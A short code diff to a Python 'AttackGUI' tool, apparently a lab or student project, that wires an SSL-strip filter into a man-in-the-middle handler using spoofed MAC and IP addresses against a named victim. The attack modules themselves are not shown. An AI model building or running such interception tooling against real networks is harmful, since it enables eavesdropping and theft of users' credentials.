@@ -6,6 +6,7 @@ import threading
 import Dns_spoofing
 import scapy.all as sc
 from mitm_handler import MitmHandler
+from SSLFilter import SSLStripFilter
 
 
 class AttackGUI:
@@ -214,7 +215,10 @@ class AttackGUI:
                 self.log(f"  Server IP:  {server_ip}")
                 self.log(f"  SSL Strip:  {use_ssl}")
 
-                # TODO: call MITM function
+                ssl_stripper = SSLStripFilter(victim, self.log)
+                mitm_handler = MitmHandler(sc.conf.iface, server_ip, victim, spoof_mac, spoof_ip, spoof_ip_v6, self.log)
+                mitm_handler.add_filter(ssl_stripper.__call__)
+                mitm_handler.start()
 
         threading.Thread(target=worker, daemon=True).start()
 
